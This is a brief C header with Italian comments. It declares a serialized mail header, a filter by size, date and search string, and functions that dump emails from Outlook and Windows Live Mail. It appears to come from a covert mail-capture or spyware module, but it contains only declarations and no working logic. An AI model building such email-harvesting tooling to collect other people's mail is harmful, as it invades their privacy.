#define MAX_HEADER_SIZE (10*1024)
#define MAPI_V2_0_PROTO	2009070301

#pragma pack(4)
struct MailSerializedMessageHeader {
  DWORD VersionFlags;       // flags for parsing serialized message
#define MAIL_FULL_BODY 0x00000001 // Ha catturato tutta la mail 
  DWORD Flags;               // message flags
  DWORD Size;                // message size
  FILETIME date;			 // data di ricezione approssimativa del messaggio
};
#pragma pack()

typedef struct {
	DWORD max_size;
	FILETIME min_date;
	FILETIME max_date;
	WCHAR search_string[32]; // XXX Se rimetto le ricerche testuali posso pensare di ingrandirlo
} mail_filter_struct;

extern BOOL IsNewerDate(FILETIME *date, FILETIME *dead_line); // Dichiarata in HM_MailCap.h
extern int CmpWildW(WCHAR *, WCHAR *); // XXX Dichiarata in HM_ProcessMonitors.h
extern BOOL g_bMailForceExit; // Semaforo di uscita per il thread e tutte le sue funzioni
extern BOOL OL_DumpEmails(mail_filter_struct *mail_filter);
extern BOOL WLM_DumpEmails(mail_filter_struct *mail_filter);
